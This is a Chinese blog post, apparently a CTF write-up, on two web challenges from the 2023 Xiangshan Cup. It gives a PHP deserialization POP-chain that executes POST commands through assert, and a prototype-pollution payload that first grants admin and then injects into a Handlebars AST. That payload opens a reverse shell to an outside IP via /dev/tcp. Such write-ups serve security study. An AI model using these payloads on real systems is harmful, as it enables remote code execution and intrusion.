@@ -1,0 +1,289 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[2023香山杯]WEB WP | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[2023香山杯]WEB WP | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="PHP_unserialize_pro
+命令执行的时候对传入参数进行检测
+public function __invoke(){
+    $shell = $this-&gt;shell;
+    $cmd = $this-&gt;cmd;..." />
+    <meta name="keywords" content="赛后总结,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [2023香山杯]WEB WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-18
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/QGeg3Wbqm/" class="post-tag">
+                  # 赛后总结
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-xiang-shan-bei-php_unserialize_promeow_blog.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="php_unserialize_pro">PHP_unserialize_pro</h1>
+<p>命令执行的时候对传入参数进行检测</p>
+<pre><code class="language-php">public function __invoke(){
+    $shell = $this-&gt;shell;
+    $cmd = $this-&gt;cmd;
+    if(preg_match('/f|l|a|g|\*|\?/i', $cmd)){
+        die(&quot;U R A BAD GUY&quot;);
+    }
+    eval($shell($cmd));
+}
+</code></pre>
+<p>使用<code>assert</code>执行<code>system(end($_POST));</code>让命令通过POST传输，POP链构造如下</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+class Welcome{
+    public $name;
+    public $arg = 'welcome';
+    public function __construct(){
+        $this-&gt;name = 'A_G00d_H4ck3r';
+        $this-&gt;arg = new H4ck3r();
+    }
+    public function __destruct(){
+        if($this-&gt;name == 'A_G00d_H4ck3r'){
+            echo $this-&gt;arg;
+        }
+    }
+}
+
+class G00d{
+    public $shell = &quot;system&quot;;
+    public $cmd = &quot;ls&quot;;
+    public function __construct($shell, $cmd){
+        $this-&gt;shell = $shell;
+        $this-&gt;cmd = $cmd;
+    }
+}
+
+class H4ck3r{
+    public $func;
+    public function __construct(){
+        $this-&gt;func = new G00d(&quot;assert&quot;, 'system(end($_POST));');
+    }
+}
+
+$s = new Welcome();
+echo serialize($s);
+
+?&gt;
+</code></pre>
+<p>读取flag<br>
+<img src="https://skyblu3519.github.io/post-images/1697563402778.png" alt="" loading="lazy"></p>
+<h1 id="meow_blog">meow_blog</h1>
+<p>分析源码，发现使用了handlebars<br>
+<img src="https://skyblu3519.github.io/post-images/1697563433479.png" alt="" loading="lazy"></p>
+<p>根据代码逻辑需要设置<code>req.session.user.style</code>，而<code>req.session.user.style</code>在style被设置<br>
+<img src="https://skyblu3519.github.io/post-images/1697563444620.png" alt="" loading="lazy"></p>
+<p>进入这个路由需要<code>session.user.username</code>为admin<br>
+<img src="https://skyblu3519.github.io/post-images/1697563453340.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1697563461447.png" alt="" loading="lazy"></p>
+<p>现在想办法成为admin，注意到middleware.js的waf部分有个<code>collection.extend</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/1697563481990.png" alt="" loading="lazy"></p>
+<p>下载下看下extend函数的功能<br>
+<img src="https://skyblu3519.github.io/post-images/1697563490218.png" alt="" loading="lazy"></p>
+<p>当deepOrParams为true时，改函数执行的是一个深度拷贝。考虑原型链污染，修改session.user.username的值为admin，在支持post请求的<code>/style</code>路由处提交</p>
+<pre><code class="language-json">{
+  &quot;key&quot;: {
+    &quot;__proto__&quot;: {
+      &quot;session&quot;: {
+        &quot;user&quot;:{
+          &quot;username&quot;:&quot;admin&quot;
+        }
+      }
+    }
+  }
+}
+</code></pre>
+<p>访问主页发现污染成功<br>
+<img src="https://skyblu3519.github.io/post-images/1697563516596.png" alt="" loading="lazy"><br>
+搜索一下Handlebars RCE的Payload：<a href="https://tyaoo.github.io/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/">Handlebars AST注入</a><br>
+<img src="https://skyblu3519.github.io/post-images/1697563524807.png" alt="" loading="lazy"></p>
+<p>用原型链污染修改对应的属性，执行命令反弹shell</p>
+<pre><code class="language-json">{
+  &quot;key&quot;: {
+    &quot;__proto__&quot;: {
+      &quot;type&quot;: &quot;Program&quot;,
+      &quot;body&quot;: [
+        {
+          &quot;type&quot;: &quot;MustacheStatement&quot;,
+          &quot;path&quot;: 0,
+          &quot;params&quot;: [
+            {
+              &quot;type&quot;: &quot;NumberLiteral&quot;,
+              &quot;value&quot;: &quot;console.log(process.mainModule.require('child_process').execSync('bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.115.227.70/9999 0&gt;&amp;1\&quot;').toString())&quot;
+            }
+          ],
+          &quot;loc&quot;: {
+            &quot;start&quot;: 0
+          }
+        }
+      ]
+    }
+  }
+}
+</code></pre>
+<p>读取flag<br>
+<img src="https://skyblu3519.github.io/post-images/1697563613313.png" alt="" loading="lazy"></p>
+<p>不过后面想了想，好像并没有执行到handlebar.complie()命令就执行了。不太清楚...</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#php_unserialize_pro">PHP_unserialize_pro</a></li>
+<li><a href="#meow_blog">meow_blog</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/java-fan-xu-lie-hua-4-cc-lian-3/">
+              <h3 class="post-title">
+                Java反序列化（4）—— CC链3
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
